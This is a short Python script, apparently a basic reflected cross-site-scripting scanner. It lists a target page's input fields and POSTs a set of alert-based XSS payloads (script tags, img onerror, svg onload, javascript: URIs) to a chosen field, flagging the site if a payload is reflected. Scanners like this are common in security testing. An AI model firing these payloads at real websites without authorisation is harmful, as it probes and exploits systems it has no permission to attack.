import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

def find_input_fields(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        input_fields = soup.find_all('input')
        return [field.get('name') for field in input_fields]
    except Exception as e:
        print(f"{Fore.RED}Error occurred while fetching input fields from {url}: {e}")
        return []

def test_xss_vulnerability(url, field_name, payload):
    try:
        response = requests.post(url, data={field_name: payload})
        if payload in response.text:
            print(f"{Fore.GREEN}XSS vulnerability detected at: {url}")
        else:
            print(f"{Fore.YELLOW}No XSS vulnerability detected at: {url}")
    except requests.RequestException as e:
        print(f"{Fore.RED}Error occurred while testing {url}: {e}")

if __name__ == "__main__":
    target_url = input("Enter your target website URL: ")
    input_fields = find_input_fields(target_url)
    
    if not input_fields:
        print(f"{Fore.RED}No input fields found on the webpage. Exiting.")
        exit()

    print(f"{Fore.CYAN}Input fields found on the webpage:")
    for i, field in enumerate(input_fields):
        print(f"{Fore.CYAN}{i+1}. {field}")

    field_choice = input("Enter the number of the input field to test: ")
    try:
        field_index = int(field_choice) - 1
        if field_index < 0 or field_index >= len(input_fields):
            print(f"{Fore.RED}Invalid input field number. Exiting.")
            exit()
    except ValueError:
        print(f"{Fore.RED}Invalid input. Please enter a number. Exiting.")
        exit()

    selected_field = input_fields[field_index]

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'/>",
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        "javascript:alert('XSS')",
        "><script>alert('XSS')</script><",
        "'-alert('XSS')-'",
        "<img src=\"javascript:alert('XSS');\">"
    ]

    for payload in xss_payloads:
        test_xss_vulnerability(target_url, selected_field, payload)
